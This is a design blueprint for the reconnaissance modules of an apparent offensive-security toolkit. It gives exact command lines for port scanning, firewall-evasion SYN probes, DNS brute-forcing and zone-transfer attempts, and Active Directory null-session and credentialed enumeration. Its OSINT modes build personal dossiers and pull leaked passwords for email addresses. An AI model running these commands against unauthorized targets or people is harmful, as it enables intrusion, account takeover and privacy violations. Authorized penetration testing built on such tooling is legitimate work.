# Reconnaissance — Category Blueprint

**Category:** `RECONNAISSANCE` | **Slug:** `recon` | **Tools Dir:** `~/jabber/jabber-tools/recon/`
**Package:** `com.jabber.jabber.modules.reconnaissance` | **Group:** Intelligence & Planning

---

## ToolManager: `reconnaissance/ToolManager.java`

Shared across all 19 reconnaissance modules. Responsible for checking installation, resolving binary paths, downloading, and updating tools.

### Tool Registry

| ID | Binary | Description | Source | Version Check | Install Method |
|----|--------|-------------|--------|---------------|----------------|
| `nmap` | `nmap` | Network mapper and port scanner | apt/pkg/brew | `nmap --version` | `apt_install` |
| `masscan` | `masscan` | High-speed port scanner | apt/github | `masscan --version` | `github_release` / `apt_install` |
| `gospider` | `gospider` | Go-based web spider | `jaeles-project/gospider` | `gospider -version` | `github_release` |
| `katana` | `katana` | Web crawling framework | `projectdiscovery/katana` | `katana -version` | `github_release` |
| `httpx` | `httpx` | HTTP probing toolkit | `projectdiscovery/httpx` | `httpx -version` | `github_release` |
| `subfinder` | `subfinder` | Subdomain discovery | `projectdiscovery/subfinder` | `subfinder -version` | `github_release` |
| `dnsx` | `dnsx` | DNS query toolkit | `projectdiscovery/dnsx` | `dnsx -version` | `github_release` |
| `waybackurls` | `waybackurls` | Wayback Machine URL fetcher | `tomnomnom/waybackurls` | `waybackurls -version` | `github_release` |
| `gau` | `gau` | GetAllUrls aggregator | `lc/gau` | `gau -version` | `github_release` |
| `whois` | `whois` | WHOIS lookup client | apt/pkg/brew | `whois --version` | `apt_install` |
| `whatweb` | `whatweb` | Web technology identifier | apt/github | `whatweb --version` | `apt_install` |
| `searchsploit` | `searchsploit` | Exploit-DB CLI search | apt (exploitdb) | `searchsploit --version` | `apt_install` |
| `dig` | `dig` | DNS lookup utility | apt (dnsutils) | `dig -v` | `apt_install` |
| `arp-scan` | `arp-scan` | ARP network scanner | apt/brew | `arp-scan --version` | `apt_install` |
| `nbtscan` | `nbtscan` | NetBIOS scanner | apt/brew | `nbtscan -V` | `apt_install` |

### Platform-Specific Installation

**Linux (amd64/arm64):**
```
apt install -y nmap masscan whois dnsutils arp-scan nbtscan exploitdb whatweb
# Go binaries: download from GitHub Releases → ~/jabber/jabber-tools/recon/
```

**Android/Termux:**
```
pkg install nmap whois dnsutils
# Go binaries: download linux/arm64 from GitHub Releases → ~/jabber/jabber-tools/recon/
```

**Android/chroot:**
```
apt install -y nmap masscan whois dnsutils arp-scan
# Go binaries: download linux/arm64 from GitHub Releases → ~/jabber/jabber-tools/recon/
```

## Standardized Infrastructure
Every module in this category MUST implement the following self-contained architecture, located in its own dedicated package (e.g., `com.jabber.jabber.modules.<category>.<module_name>/`):

- **`[ModuleName]Module.java`**: The primary controller that defines the `@JABBERModule` metadata, declares the `ModuleInputField` schemas for each execution mode, and handles the orchestration between the UI and the execution engine.
- **`[ModuleName]Engine.java`**: The core execution orchestrator that implements the mandatory 8-step execution doctrine. It manages the high-level logic, tool sequencing, and results aggregation.
- **`ToolManager.java`**: Registry for the 5+ required tools. Handles tool status checks, versioning, and automatic dependency installation via OS-specific package managers (apt, pip, github_release).
- **`InputSanitizer.java`**: Mode-aware validation logic that ensures all inputs (IPs, domains, file paths) are sanitized and conform to security best practices before process execution.
- **`ProcessExecutor.java`**: A thread-safe, low-level process runner that manages `ProcessBuilder` lifecycles, real-time stdout/stderr streaming, and timeout enforcement.
- **`CommandRecord.java`**: A structured data container that captures full telemetry for every command executed (CLI strings, exit codes, durations, and output previews) for the final report.
- **`ReportGenerator.java`**: The findings aggregator that transforms raw tool output and `CommandRecord` data into high-fidelity, structured reports in JSON, Markdown, and HTML formats. It is strictly responsible for capturing, organizing, and physically saving all generated outputs (files, payloads, artifacts) into the reporting structure.

---

## Execution Doctrine (MANDATORY - SURGICAL)

Every module MUST implement the following 8-step execution loop in its `[ModuleName]Engine.java`:

1.  **Validate Mode**: Verify that the selected `ModuleMode` is supported and available.
2.  **Sanitize Schema**: Validate and sanitize all user-provided inputs against the mode-specific schema using `InputSanitizer`.
    - **Failure**: If mandatory input (Domain, IP, CIDR) is missing, return `[Input required for execution]`.
3.  **Target Intelligence**: Perform mandatory infrastructure discovery (DNS resolution, WHOIS lookup, server fingerprinting via `dnsx`, `subfinder`, `httpx`).
4.  **Tool Readiness & Verification**: Resolve binary paths via `ToolManager` AND verify the specific tools explicitly selected by the user for this execution.
    - **Failure**: If `selectedTools` list is empty, return `[Must select a tool for execution]`.
5.  **Surgical Command Orchestration**: Build the exact command strings and arguments ONLY for the external tools that were explicitly selected by the user via the frontend toggles.
    - If a tool is not selected, it MUST NOT execute.
    - If one tool is selected, only its command logic runs.
    - If multiple tools are selected, only those tools' commands run sequentially.
6.  **Real-Time Streaming**: Execute selected tools sequentially via `ProcessExecutor` and stream live stdout/stderr logs to the `TaskContext` for UI visibility.
7.  **Findings Extraction**: Parse raw tool output using `ReportGenerator` to identify and extract high-fidelity security findings.
    - **Anti-Pollution**: Findings MUST be flat and professional. Remove CLI strings and durations from executive finding reports.
8.  **Full Telemetry**: Aggregate all telemetry data into the final `ModuleResult` for complete auditability.

---

### Output & Transparency

- **NO Phantom Findings**: If a tool returns no data or an error, no finding is generated. Every result must be verified by real data.
- **Full Traceability**: Every report must include the exact CLI commands executed to ensure transparency and reproducibility.
- **Multi-Format Delivery**: Findings are generated simultaneously in JSON (for automation), HTML (for presentation), and Markdown (for documentation).

---

## Artifact & Output Generation Standard (J. Standard)
Every module in this category MUST physically create and preserve the following outputs:
- **Location**: `reports/artifacts/`, `reports/payloads/`, `reports/outputs/`, or `reports/analysis/` within the module workspace.
- **Naming**: `[Mode]_[Timestamp]_[OriginalName].[Ext]`
- **Hashing**: Mandatory SHA256 hashing for all generated files.
- **Reporting**: All files must be linked and accessible via the final `ReportGenerator` output.

---

## Frontend Requirements

Every module in the **Reconnaissance** category MUST implement the following UI components to ensure seamless interaction with the V5 architecture:

1. **Execution Mode Toggle**: Switch between discovery strategies (e.g., `SURVEY` vs `DEEP`).
2. **Dynamic Tool Selection Table**: Once an execution mode is selected, render a horizontal table listing all tools associated with that mode. The user must be able to toggle individual tools on/off to directly control execution behavior.
3. **Artifact Integration**: Direct links to the **Artifacts System (Category 21)** for viewing subdomain lists, DNS records, and network maps.
4. **Live Console Stream**: Real-time visualization of tool output (e.g., `nmap` progress, `subfinder` logs).

---

## Modules

### 1. Web Crawler
**ID:** `recon-web-crawler` | **Risk:** LOW | **File:** `WebCrawlerModule.java`
**Tools:** `gospider`, `katana`, `httpx`, `waybackurls`, `gau`, `subfinder`, `dnsx`, `whois`

#### Execution Modes:

- **`SRVY`** (Short Name: `SRVY`)
    - **Purpose**: Fast infrastructure discovery and surface-level crawling.
    - **Input Schema**: `{ url: String, domain: String, depth: int }`
    - **Multi-Tool Command Logic (Sequential)**:
        1. `subfinder -d <domain> -silent` (Discovery)
        2. `dnsx -d <domain> -a -resp -silent` (Resolution)
        3. `httpx -u <url> -tech-detect -status-code -silent` (Fingerprinting)
        4. `gospider -s <url> -d <depth> -c 10 -silent` (Crawling)
        5. `whois <domain>` (Ownership)
    - **Input-to-Command Mapping**: 
        - `<domain>` used by `subfinder`, `dnsx`, `whois`.
        - `<url>` used by `httpx`, `gospider`.
        - `<depth>` used by `gospider`.
    - **Execution Flow**: Discovery -> Resolution -> Fingerprinting -> Crawling -> Attribution.
    - **Cross-Platform**: `subfinder` and `dnsx` (Go) work on all; `whois` (apt) on Linux/chroot.
    - **Output Generation & Artifacts**:
        - `reports/outputs/SURVEY_[Timestamp]_subfinder.txt`: Raw subdomain list.
        - `reports/outputs/SURVEY_[Timestamp]_dnsx.json`: Resolved DNS records.
        - `reports/artifacts/SURVEY_[Timestamp]_whois.txt`: Raw WHOIS record.
        - `reports/analysis/SURVEY_[Timestamp]_httpx.json`: Server fingerprinting data.

- **`DEEP`** (Short Name: `DEEP`)
    - **Purpose**: Exhaustive asset mapping and historical URL analysis.
    - **Input Schema**: `{ url: String, domain: String, depth: int }`
    - **Multi-Tool Command Logic (Parallel/Sequential)**:
        1. `katana -u <url> -d <depth> -silent -o urls.txt` (Deep Crawl)
        2. `waybackurls <domain> >> urls.txt` (History)
        3. `gau <domain> >> urls.txt` (Aggregation)
        4. `httpx -l urls.txt -tech-detect -title -json -silent` (Validation)
        5. `dnsx -d <domain> -a -resp -silent` (Active Infra Mapping)
    - **Input-to-Command Mapping**:
        - `<url>`, `<depth>` -> `katana`.
        - `<domain>` -> `waybackurls`, `gau`, `dnsx`.
    - **Execution Flow**: Parallel (Katana/Wayback/GAU) -> Aggregate -> Sequential (httpx/dnsx).
    - **Cross-Platform**: All Go binaries (amd64/arm64) supported on Linux and Android.
    - **Output Generation & Artifacts**:
        - `reports/outputs/DEEP_[Timestamp]_katana_urls.txt`: Comprehensive crawled URL list.
        - `reports/outputs/DEEP_[Timestamp]_aggregated_history.txt`: Combined Wayback/GAU/Katana data.
        - `reports/analysis/DEEP_[Timestamp]_httpx_deep.json`: Full tech stack validation results.
        - `reports/artifacts/DEEP_[Timestamp]_dns_map.json`: Full infrastructure mapping.

---

### 2. Port Scanner
**ID:** `recon-portscanner` | **Risk:** HIGH | **File:** `PortScannerModule.java`
**Tools:** `nmap`, `masscan` (**sudo**), `arp-scan` (**sudo**), `dnsx`, `httpx`
**Sudo Tools:** `masscan`, `arp-scan` — See modulesv5.md §6 (Elevated Privilege Workflow)

#### Execution Modes:

- **`ACTV`** (Short Name: `ACTV`)
    - **Purpose**: Multi-layered port discovery and service validation.
    - **Input Schema**: `{ target: String, rate: int, ports: String }`
    - **Multi-Tool Command Logic**:
        1. `masscan <target> -p<ports> --rate <rate> -oJ masscan.json` (Rapid Probe)
        2. `nmap -sV -p<ports> --version-intensity 5 <target>` (Service ID)
        3. `httpx -u <target> -p <ports> -silent` (Web Probing)
        4. `dnsx -d <target> -ptr -silent` (Reverse DNS)
        5. `arp-scan -l` (Local adjacency check)
    - **Input-to-Command Mapping**:
        - `<target>`, `<ports>` -> `masscan`, `nmap`, `httpx`.
        - `<rate>` -> `masscan`.
    - **Execution Flow**: Masscan -> Parse Results -> Nmap/httpx on open ports -> dnsx.
    - **Cross-Platform**: `masscan` requires `root` (Linux/chroot); `arp-scan` local only.
    - **Output Generation & Artifacts**:
        - `reports/outputs/ACTIVE_[Timestamp]_masscan.json`: High-speed scan results.
        - `reports/outputs/ACTIVE_[Timestamp]_nmap.xml`: Service identification data.
        - `reports/analysis/ACTIVE_[Timestamp]_httpx_web.json`: Web service probes.
        - `reports/artifacts/ACTIVE_[Timestamp]_arp_scan.txt`: Local network adjacency map.

- **`SRVY`** (Short Name: `SRVY`)
    - **Purpose**: Passive-first network mapping and host discovery.
    - **Input Schema**: `{ cidr: String, interface: String }`
    - **Multi-Tool Command Logic**:
        1. `arp-scan -I <interface> <cidr>` (L2 Discovery)
        2. `nmap -sn <cidr>` (L3 Ping Sweep)
        3. `dnsx -d <cidr> -ptr -silent` (Reverse Mapping)
        4. `httpx -l targets.txt -status-code -silent` (Web presence)
        5. `masscan <cidr> --top-ports 100 --rate 1000` (Fast Sample)
    - **Execution Flow**: L2 Discovery -> L3 Sweep -> DNS Mapping -> Web Probing.
    - **Output Generation & Artifacts**:
        - `reports/outputs/SURVEY_[Timestamp]_ping_sweep.txt`: List of live hosts.
        - `reports/artifacts/SURVEY_[Timestamp]_arp_discovery.txt`: MAC-to-IP mapping.
        - `reports/outputs/SURVEY_[Timestamp]_dns_ptr.json`: Reverse DNS records.

---

### 3. Banner Grabber
**ID:** `recon-banner-grab` | **Risk:** MEDIUM | **File:** `BannerGrabberModule.java`
**Tools:** `nmap`, `dig`, `whois`, `whatweb`, `searchsploit`, `dnsx`, `httpx`, `subfinder`

#### Execution Modes:

- **`FNGR`** (Short Name: `FNGR`)
    - **Purpose**: Total technology stack identification and vulnerability correlation.
    - **Input Schema**: `{ target: String, domain: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -sV -p- --script banner <target> -oX nmap.xml` (Banner Grab)
        2. `whatweb <target>` (Web Tech)
        3. `searchsploit --nmap nmap.xml --json` (Vulnerability Correlation)
        4. `httpx -u <target> -tech-detect -silent` (HTTP Identity)
        5. `dnsx -d <domain> -a -resp -silent` (DNS Context)
    - **Execution Flow**: Nmap -> Searchsploit -> whatweb/httpx/dnsx.
    - **Output Generation & Artifacts**:
        - `reports/artifacts/FINGER_[Timestamp]_nmap.xml`: Full XML banner scan results.
        - `reports/outputs/FINGER_[Timestamp]_vulnerabilities.json`: Searchsploit correlation data.
        - `reports/analysis/FINGER_[Timestamp]_whatweb.txt`: Raw technology identification.
        - `reports/analysis/FINGER_[Timestamp]_httpx_tech.json`: HTTP identity fingerprint.

- **`INFR`** (Short Name: `INFR`)
    - **Purpose**: Full infrastructure mapping and attribution.
    - **Input Schema**: `{ domain: String }`
    - **Multi-Tool Command Logic**:
        1. `subfinder -d <domain> -silent` (Subdomains)
        2. `dnsx -d <domain> -a -cname -mx -ns -soa -txt` (Records)
        3. `whois <domain>` (Whois)
        4. `dig <domain> ANY` (Detailed Query)
        5. `httpx -l subs.txt -status-code -title` (Asset Validation)
    - **Execution Flow**: Subfinder -> dnsx/dig/whois -> httpx validation.
    - **Output Generation & Artifacts**:
        - `reports/outputs/INFRA_[Timestamp]_subdomains.txt`: Discovered subdomains.
        - `reports/outputs/INFRA_[Timestamp]_dns_records.json`: Multi-record DNS dump.
        - `reports/artifacts/INFRA_[Timestamp]_whois_full.txt`: Comprehensive WHOIS data.
        - `reports/artifacts/INFRA_[Timestamp]_dig_any.txt`: Raw DIG ANY response.

---

### 4. DNS Enumerator
**ID:** `recon-dns-enum` | **Risk:** LOW | **File:** `dnsenum/DNSEnumeratorModule.java`
**Tools:** `subfinder`, `dnsx`, `dig`, `nmap`, `whois`

#### Execution Modes:

- **`SRVY`** (Short Name: `SRVY`)
    - **Purpose**: Passive and light active discovery of DNS infrastructure.
    - **Input Schema**: `{ domain: String }`
    - **Multi-Tool Command Logic**:
        1. `subfinder -d <domain> -silent` (Discovery)
        2. `dnsx -d <domain> -a -cname -mx -ns -soa -txt -resp -silent` (Resolution)
        3. `dig <domain> ANY` (Detailed Query)
        4. `whois <domain>` (Attribution)
        5. `nmap -sn <domain>` (Liveness Check)
    - **Execution Flow**: Discovery -> Resolution -> Detailed Query -> Attribution -> Liveness.
    - **Output Generation & Artifacts**:
        - `reports/outputs/SRVY_[Timestamp]_dns_records.json`: Full resource record resolution.
        - `reports/artifacts/SRVY_[Timestamp]_dig_output.txt`: Raw recursive query results.
        - `reports/artifacts/SRVY_[Timestamp]_whois.txt`: Registrar and ownership info.

- **`BRUT`** (Short Name: `BRUT`)
    - **Purpose**: Intensive DNS brute-forcing and zone enumeration.
    - **Input Schema**: `{ domain: String, wordlist: Path }`
    - **Multi-Tool Command Logic**:
        1. `dnsx -d <domain> -w <wordlist> -a -resp -silent` (Active Brute)
        2. `dig @8.8.8.8 <domain> AXFR` (Zone Transfer Attempt)
        3. `subfinder -d <domain> -silent` (Passive Fallback)
        4. `nmap -p 53 -sU <domain>` (DNS Server Probe)
        5. `whois <domain>` (Registry Verification)
    - **Execution Flow**: Brute-force -> Zone Transfer -> Passive Sync -> Port Probe -> Whois.
    - **Output Generation & Artifacts**:
        - `reports/outputs/BRUT_[Timestamp]_found_subdomains.txt`: List of validated subdomains.
        - `reports/artifacts/BRUT_[Timestamp]_zone_transfer.txt`: Result of AXFR attempt.
        - `reports/outputs/BRUT_[Timestamp]_active_resolvers.json`: Validated DNS servers.

---

### 5. Whois Lookup
**ID:** `recon-whois` | **Risk:** LOW | **File:** `whois/WhoisModule.java`
**Tools:** `whois`, `dig`, `nmap`, `subfinder`, `dnsx`, `amass`, `bgpq4`, `httpx`, `sherlock`, `maigret`, `shodan`, `holehe`, `h8mail`, `ignorant`

#### Execution Modes:

- **`RECO`** (Short Name: `RECO`)
    - **Purpose**: Total identity and network range attribution.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `whois <target>` (Primary Lookup)
        2. `shodan search hostname:<target>` (Passive Exposure Map)
        3. `dig -x <target>` (Reverse DNS Resolution)
        4. `dnsx -d <target> -ptr -silent` (Infrastructure Map)
        5. `subfinder -d <target> -silent` (Passive Discovery)

- **`ASST`** (Short Name: `ASST`)
    - **Purpose**: Ownership verification and network neighbor discovery.
    - **Input Schema**: `{ target: String, cidr: String }`
    - **Multi-Tool Command Logic**:
        1. `whois <target>` (Ownership)
        2. `nmap -sn <cidr>` (Neighbor Discovery)
        3. `dnsx -d <cidr> -ptr -silent` (Neighbor Resolution)
        4. `dig <target> ANY` (Resource Records)
        5. `shodan host <cidr>` (Target Exposure)

- **`BGPR`** (Short Name: `BGPR`)
    - **Purpose**: Autonomous System (AS) enumeration and BGP route mapping.
    - **Input Schema**: `{ asn: String }`
    - **Multi-Tool Command Logic**:
        1. `whois <asn>` (Fetch AS routing objects)
        2. `bgpq4 <asn>` (Generate IPv4/IPv6 prefixes for the AS)
        3. `nmap -sn -iL prefixes.txt` (Ping sweep the AS)
        4. `dnsx -ptr` (Resolve live hosts)

- **`CORP`** (Short Name: `CORP`)
    - **Purpose**: Broad corporate infrastructure expansion based on WHOIS email/registrant correlations.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `amass intel -whois -d <target>` (Find other domains owned by the same WHOIS registrant)
        2. `subfinder -dL domains.txt` (Find subdomains across all corp domains)
        3. `dnsx -l subdomains.txt -a -aaaa -cname -silent` (Resolve all corp infrastructure)
        4. `httpx -l resolved.txt -title -tech -silent` (Probe for web portals)

- **`PERS`** (Short Name: `PERS`)
    - **Purpose**: Deep social media and online presence correlation for a given handle.
    - **Input Schema**: `{ handle: String }`
    - **Multi-Tool Command Logic**:
        1. `sherlock <handle>` (Hunt social media platforms)
        2. `maigret <handle>` (Build comprehensive dossier)

- **`BRCH`** (Short Name: `BRCH`)
    - **Purpose**: Aggressive breach intelligence and leaked password extraction.
    - **Input Schema**: `{ email: String }`
    - **Multi-Tool Command Logic**:
        1. `holehe <email>` (Check 120+ platforms for accounts)
        2. `h8mail -t <email>` (Hunt for password leaks)
        3. `ignorant <email>` (Check specific phone/email platforms)

---

### 6. Email Verifier
**ID:** `recon-email-verify` | **Risk:** LOW | **File:** `emailverify/EmailVerifierModule.java`
**Tools:** `recon-ng`, `holehe`, `emailrep`, `maigret`, `h8mail`, `ignorant`, `katana`, `curl`

#### Execution Modes:

- **`PROB`** (Short Name: `PROB`)
    - **Purpose**: Scraping corporate domains for associated email addresses.
    - **Input Schema**: `{ domain: String }`
    - **Multi-Tool Command Logic**:
        1. `recon-ng -m recon/domains-contacts/` (Domain email scraping)
        2. `katana -u <domain> -jc -d 2` (Deep crawl for mailto)
        3. `curl -sL <domain>` (Fast landing page scrape)

- **`HUNT`** (Short Name: `HUNT`)
    - **Purpose**: targeted email reputation and history profiling.
    - **Input Schema**: `{ email: String }`
    - **Multi-Tool Command Logic**:
        1. `emailrep <email>` (Reputation and history profile)

- **`SOCI`** (Short Name: `SOCI`)
    - **Purpose**: Footprinting email prefixes across social platforms.
    - **Input Schema**: `{ username: String }`
    - **Multi-Tool Command Logic**:
        1. `maigret <username>` (Hunt username prefix globally)

- **`BRCH`** (Short Name: `BRCH`)
    - **Purpose**: Check for compromised data and registered accounts.
    - **Input Schema**: `{ email: String }`
    - **Multi-Tool Command Logic**:
        1. `holehe <email>` (Account registration checks)
        2. `h8mail -t <email>` (Leaked password discovery)
        3. `ignorant <email>` (Social footprint checks)
    - **Execution Flow**: Account Check -> Breach Hunting -> Social Footprint.
    - **Output Generation & Artifacts**:
        - `reports/outputs/BRCH_[Timestamp]_accounts.json`: Registered accounts.
        - `reports/artifacts/BRCH_[Timestamp]_leaks.txt`: Raw password leak data.
        - `reports/analysis/BRCH_[Timestamp]_identity.json`: Aggregated identity exposure.

- **`SMTP`** (Short Name: `SMTP`)
    - **Purpose**: Deep protocol interrogation and vulnerability scanning.
    - **Input Schema**: `{ email: String, domain: String }`
    - **Multi-Tool Command Logic**:
        1. Internal Java Socket (Robust EHLO/RCPT/STARTTLS Probe)
        2. `swaks --server <mx> --to <email> --quit-after RCPT` (Relay & Delivery Check)
        3. `nmap -p 25,465,587 --script=smtp-commands,smtp-open-relay <mx>` (Vulnerability Scan)
    - **Execution Flow**: Internal Socket Probe -> Swaks Validation -> Nmap Vuln Scan.
    - **Output Generation & Artifacts**:
        - `reports/outputs/SMTP_[Timestamp]_session.log`: Raw SMTP transcript.
        - `reports/artifacts/SMTP_[Timestamp]_nmap_scan.txt`: Nmap script outputs.

---

### 7. Network Ping Sweep
**ID:** `recon-ping-sweep` | **Risk:** MEDIUM | **File:** `NetworkPingSweepModule.java`
**Tools:** `nmap`, `masscan`, `arp-scan`, `nbtscan`, `fping`

#### Execution Modes:

- **`SRVY`** (Short Name: `SRVY`)
    - **Purpose**: Fast multi-protocol host discovery across a network.
    - **Input Schema**: `{ cidr: String, interface: String }`
    - **Multi-Tool Command Logic**:
        1. `fping -a -g <cidr> -q` (ICMP Sweep)
        2. `nmap -sn -PE <cidr>` (Echo Probe)
        3. `masscan <cidr> --top-ports 10 --rate 1000` (Fast Port Probe)
        4. `arp-scan -I <interface> <cidr>` (L2 Discovery)
        5. `nbtscan <cidr>` (NetBIOS Discovery)
    - **Execution Flow**: ICMP -> L3 Sweep -> Fast Port Probe -> L2 Discovery -> NetBIOS.
    - **Output Generation & Artifacts**:
        - `reports/outputs/SURVEY_[Timestamp]_live_hosts.txt`: List of responsive IP addresses.
        - `reports/artifacts/SURVEY_[Timestamp]_arp_table.txt`: MAC-to-IP mappings.
        - `reports/outputs/SURVEY_[Timestamp]_nbt_discovery.json`: NetBIOS name resolution results.

- **`ACTV`** (Short Name: `ACTV`)
    - **Purpose**: Thorough host liveness and service presence check.
    - **Input Schema**: `{ cidr: String, ports: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -sn -PS<ports> <cidr>` (TCP SYN Sweep)
        2. `masscan <cidr> -p<ports> --rate 2000` (Dense Port Probe)
        3. `fping -A -g <cidr>` (Address Resolution)
        4. `nbtscan -r <cidr>` (NetBIOS Detail)
        5. `arp-scan -l` (Local Adjacency)
    - **Execution Flow**: SYN Sweep -> Port Probe -> Address Check -> NetBIOS -> ARP.
    - **Output Generation & Artifacts**:
        - `reports/outputs/ACTIVE_[Timestamp]_syn_sweep.json`: Detailed port liveness results.
        - `reports/artifacts/ACTIVE_[Timestamp]_nbt_scan.txt`: Verbose NetBIOS enumeration.
        - `reports/outputs/ACTIVE_[Timestamp]_address_map.json`: IP-to-Hostname correlation.

---

### 8. Ping Sweeper
**ID:** `recon-pingsweep` | **Risk:** CRITICAL | **File:** `pingsweep/PingSweeperModule.java`
**Tools:** `hping3`, `masscan`, `rustscan`, `zmap`, `netdiscover`, `fping`, `arp-scan`, `nbtscan`, `nmap`

#### Execution Modes:

- **`SRVY`** (Short Name: `SRVY`)
    - **Purpose**: Fast infrastructure survey and liveness check.
    - **Input Schema**: `{ cidr: String }`
    - **Multi-Tool Command Logic**:
        1. `fping -a -g <cidr>` (ICMP Sweep)
        2. `arp-scan --localnet` (L2 Mapping)
        3. `netdiscover -p -r <cidr> -P` (Passive/Active ARP)
    - **Execution Flow**: ICMP -> L2 Map -> ARP Discovery.
    - **Output Generation & Artifacts**:
        - `reports/outputs/SRVY_[Timestamp]_live_hosts.txt`: List of responsive IPs.
        - `reports/artifacts/SRVY_[Timestamp]_arp_map.json`: Local network adjacency map.

- **`STH`** (Short Name: `STH`)
    - **Purpose**: Surgical evasion-focused probing to bypass firewalls.
    - **Input Schema**: `{ cidr: String, target_port: int }`
    - **Multi-Tool Command Logic**:
        1. `hping3 -S -c 1 -p <target_port> <cidr>` (Custom SYN Probe)
        2. `nmap -sS -Pn -p <target_port> <cidr>` (Stealth SYN Scan)
    - **Execution Flow**: hping3 Probe -> Nmap Validation.
    - **Output Generation & Artifacts**:
        - `reports/artifacts/STH_[Timestamp]_evasion_patterns.json`: Analysis of firewall response behavior.

- **`AGGR`** (Short Name: `AGGR`)
    - **Purpose**: Ultra high-speed infrastructure mapping.
    - **Input Schema**: `{ cidr: String, target_port: String }`
    - **Multi-Tool Command Logic**:
        1. `masscan -p<target_port> --rate 1000 <cidr>` (High-Speed Probe)
        2. `rustscan -a <cidr> -- <target_port>` (Rapid Port Scan)
        3. `zmap -p 80 <cidr> -o -` (Wide-Range Sweep)
    - **Execution Flow**: Masscan -> RustScan -> ZMap.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AGGR_[Timestamp]_open_ports.json`: Results of the high-speed sweep.
        - `reports/artifacts/AGGR_[Timestamp]_zmap_raw.txt`: Raw infrastructure mapping data.

- **`ADVR`** (Short Name: `ADVR`)
    - **Purpose**: Deep adversarial attribution and metadata extraction.
    - **Input Schema**: `{ cidr: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -sV -O -p- <cidr>` (OS/Service ID)
        2. `enum4linux -a <cidr>` (SMB/NetBIOS Enum)
        3. `nbtscan <cidr>` (Identity Map)
    - **Execution Flow**: Fingerprinting -> SMB Enum -> Identity Mapping.
    - **Output Generation & Artifacts**:
        - `reports/outputs/ADVR_[Timestamp]_host_identity.json`: Detailed host attribution metadata.
        - `reports/artifacts/ADVR_[Timestamp]_smb_shares.txt`: Extracted SMB share information.

---

### 9. ARP Sniffer
**ID:** `recon-arp-sniffer` | **Risk:** MEDIUM | **File:** `ARPSnifferModule.java`
**Tools:** `arp-scan`, `nmap`, `nbtscan`, `ip`, `tcpdump`

#### Execution Modes:

- **`ACTV`** (Short Name: `ACTV`)
    - **Purpose**: Proactive ARP mapping and host identification.
    - **Input Schema**: `{ interface: String, cidr: String }`
    - **Multi-Tool Command Logic**:
        1. `arp-scan -I <interface> <cidr>` (L2 Sweep)
        2. `nmap -sn <cidr> --send-eth` (Ethernet Probe)
        3. `nbtscan <cidr>` (NetBIOS Map)
        4. `ip neighbor show` (Cache Dump)
        5. `tcpdump -c 100 -i <interface> arp` (Live Verification)
    - **Execution Flow**: L2 Sweep -> Eth Probe -> NetBIOS Map -> Cache Dump -> Live Check.
    - **Output Generation & Artifacts**:
        - `reports/artifacts/ACTIVE_[Timestamp]_arp_sweep.pcap`: Capture of ARP responses.
        - `reports/outputs/ACTIVE_[Timestamp]_neighbor_cache.json`: Local IP neighbor table dump.
        - `reports/outputs/ACTIVE_[Timestamp]_nbt_map.json`: NetBIOS mapping for discovered hosts.

- **`PASS`** (Short Name: `PASS`)
    - **Purpose**: Stealthy observation of ARP traffic and network changes.
    - **Input Schema**: `{ interface: String, timeout: int }`
    - **Multi-Tool Command Logic**:
        1. `tcpdump -i <interface> -p arp -G <timeout> -W 1 -w out.pcap` (Capture)
        2. `ip neighbor show` (Current State)
        3. `nmap -sn -PR <interface_ip>/24` (Silent ARP Ping)
        4. `arp-scan -l -t 500` (Slow Probe)
        5. `nbtscan <interface_ip>/24` (Network Context)
    - **Execution Flow**: Capture -> State Check -> Silent Ping -> Slow Probe -> Context.
    - **Output Generation & Artifacts**:
        - `reports/artifacts/PASSIVE_[Timestamp]_stealth_capture.pcap`: Raw pcap of observed ARP traffic.
        - `reports/outputs/PASSIVE_[Timestamp]_observed_hosts.txt`: List of hosts detected via passive sniffing.
        - `reports/analysis/PASSIVE_[Timestamp]_network_context.json`: Passive network topology map.

---

### 10. AD Computer Enumerator
**ID:** `recon-ad-computers` | **Risk:** MEDIUM | **File:** `adcomputer/ADComputerModule.java`
**Tools:** `nmap`, `dig`, `ldapsearch`, `rpcclient`, `net`, `crackmapexec`

#### Execution Modes:

- **`SRVY`** (Short Name: `SRVY`)
    - **Purpose**: Passive and non-privileged enumeration of domain computers.
    - **Input Schema**: `{ dc: String, domain: String, base_dn: String }`
    - **Multi-Tool Command Logic**:
        1. `ldapsearch -x -H ldap://<dc> -b <base_dn> "(objectClass=computer)"` (LDAP List)
        2. `dig -t SRV _ldap._tcp.<domain>` (SRV Discovery)
        3. `rpcclient -U "" -N -c "enumprivs" <dc>` (Null Session Probe)
        4. `nmap -sn <dc>/24` (Network Context)
        5. `net ads info -S <dc>` (Domain Info)
    - **Execution Flow**: LDAP List -> SRV Discovery -> RPC Probe -> Network Context -> Ads Info.
    - **Output Generation & Artifacts**:
        - `reports/outputs/SURVEY_[Timestamp]_ad_computer_list.json`: List of computers discovered via LDAP and RPC.
        - `reports/artifacts/SURVEY_[Timestamp]_srv_records.txt`: Discovered AD service (SRV) records.
        - `reports/analysis/SURVEY_[Timestamp]_domain_info.json`: Detailed domain configuration and DC information.

- **`ACTV`** (Short Name: `ACTV`)
    - **Purpose**: Authenticated enumeration and validation of computer assets.
    - **Input Schema**: `{ dc: String, user: String, pass: Password, base_dn: String }`
    - **Multi-Tool Command Logic**:
        1. `ldapsearch -x -H ldap://<dc> -D <user> -w <pass> -b <base_dn> "(objectClass=computer)"` (Auth LDAP)
        2. `rpcclient -U "<user>%<pass>" -c "enumdomusers" <dc>` (RPC Enumeration)
        3. `crackmapexec smb <dc>/24 -u <user> -p <pass>` (SMB Validation)
        4. `nmap -sV -O -p 445,139 <dc>/24` (OS Fingerprinting)
        5. `dig -t A <dc>` (Host Resolution)
    - **Execution Flow**: Auth LDAP -> RPC Enum -> SMB Validation -> Fingerprinting -> Resolution.
    - **Output Generation & Artifacts**:
        - `reports/outputs/ACTIVE_[Timestamp]_validated_computers.json`: Verified list of domain computers with SMB status.
        - `reports/artifacts/ACTIVE_[Timestamp]_os_fingerprints.xml`: Nmap XML results for OS discovery.
        - `reports/analysis/ACTIVE_[Timestamp]_rpc_enum.txt`: Detailed RPC enumeration data for the target DC.

---

### 11. AD User Enumerator
